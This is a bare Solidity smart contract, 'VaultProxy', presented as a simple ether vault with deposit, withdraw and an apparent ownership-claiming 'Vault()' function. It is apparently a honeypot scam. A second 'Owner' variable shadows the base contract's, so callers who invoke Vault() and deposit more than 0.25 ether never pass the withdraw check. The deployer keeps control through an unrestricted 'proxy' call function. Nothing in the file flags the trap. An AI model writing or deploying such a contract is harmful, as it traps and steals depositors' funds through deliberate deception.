1 pragma solidity ^0.4.23;
2 
3 contract Proxy  {
4     modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
5     function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
6     function proxy(address target, bytes data) public payable {
7         target.call.value(msg.value)(data);
8     }
9 }
10 
11 contract VaultProxy is Proxy {
12     address public Owner;
13     mapping (address => uint256) public Deposits;
14 
15     function () public payable { }
16     
17     function Vault() public payable {
18         if (msg.sender == tx.origin) {
19             Owner = msg.sender;
20             deposit();
21         }
22     }
23     
24     function deposit() public payable {
25         if (msg.value > 0.25 ether) {
26             Deposits[msg.sender] += msg.value;
27         }
28     }
29     
30     function withdraw(uint256 amount) public onlyOwner {
31         if (amount>0 && Deposits[msg.sender]>=amount) {
32             msg.sender.transfer(amount);
33         }
34     }
35 }